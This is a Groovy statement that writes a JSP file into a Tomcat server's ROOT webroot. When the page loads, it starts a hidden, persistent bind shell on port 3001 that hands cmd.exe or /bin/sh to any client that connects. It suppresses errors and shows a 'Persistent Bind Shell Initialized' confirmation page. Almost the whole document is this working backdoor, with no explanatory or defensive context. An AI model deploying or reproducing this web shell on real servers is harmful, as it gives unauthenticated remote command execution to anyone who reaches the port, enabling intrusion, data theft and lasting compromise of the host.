new File("C:/<tomcatroot>/ROOT/threaded.jsp").text ='''<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%!
    // Static block to ensure the listener thread is only started once.
    static {
        new Thread(new Runnable() {
            public void run() {
                // --- CONFIGURATION ---
                int port = 3001; // The port to listen on.
                // -------------------

                try {
                    ServerSocket serverSocket = new ServerSocket(port);
                    // This is the key change: an infinite loop to accept multiple clients.
                    while (true) {
                        // Wait for a client to connect. This call blocks until a connection is made.
                        Socket clientSocket = serverSocket.accept();
                        
                        // When a client connects, create a NEW THREAD to handle them.
                        // This allows the main loop to go back and wait for the next client.
                        new Thread(new ClientHandler(clientSocket)).start();
                    }
                } catch (Exception e) {
                    // Fail silently in the background.
                }
            }
        }).start();
    }

    // This class handles the logic for a single connected client.
    static class ClientHandler implements Runnable {
        private final Socket clientSocket;

        ClientHandler(Socket socket) {
            this.clientSocket = socket;
        }

        public void run() {
            try {
                String shell = System.getProperty("os.name").toLowerCase().startsWith("windows") ? "cmd.exe" : "/bin/sh";
                Process process = Runtime.getRuntime().exec(shell);

                // Redirect I/O for this specific client
                new Thread(new StreamRedirector(process.getInputStream(), clientSocket.getOutputStream())).start();
                new Thread(new StreamRedirector(process.getErrorStream(), clientSocket.getOutputStream())).start();
                new Thread(new StreamRedirector(clientSocket.getInputStream(), process.getOutputStream())).start();

                process.waitFor();
            } catch (Exception e) {
                // An exception here usually means the client disconnected.
            } finally {
                try { clientSocket.close(); } catch (IOException e) {}
            }
        }
    }

    // Helper class to redirect streams. No changes needed here.
    static class StreamRedirector implements Runnable {
        private final InputStream in;
        private final OutputStream out;
        StreamRedirector(InputStream in, OutputStream out) { this.in = in; this.out = out; }
        public void run() {
            try {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                    out.flush();
                }
            } catch (IOException e) {}
        }
    }
%>
<html>
<body>
    <h1>Persistent Bind Shell Initialized</h1>
    <p>A persistent listener should now be active on port <strong>3001</strong>.</p>
</body>
</html>
'''
